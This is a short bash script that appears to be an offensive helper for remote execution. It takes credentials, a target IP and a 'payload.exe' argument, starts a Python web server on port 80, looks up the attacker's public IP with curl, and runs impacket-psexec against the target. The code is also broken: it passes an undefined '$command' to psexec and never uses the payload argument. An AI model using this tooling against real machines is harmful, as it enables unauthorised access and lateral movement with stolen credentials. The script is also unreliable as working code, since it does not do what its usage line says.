#!/bin/bash

# Check for the correct number of arguments
if [ "$#" -ne 4 ]; then
    echo "Usage: $0 <username> <password> <ip_address> <payload.exe>"
    exit 1
fi

# Assign the arguments to variables
username="$1"
password="$2"
ip_address="$3"
payload="$4"

# Run the command using Impacket's psexec.py
/usr/bin/python3 -m http.server 80 &
echo "Started web server on ip $(curl -s ifconfig.me)"
echo "impacket-psexec $username":"$password"@"$ip_address" "$command"
impacket-psexec "$username":"$password"@"$ip_address" "$command"
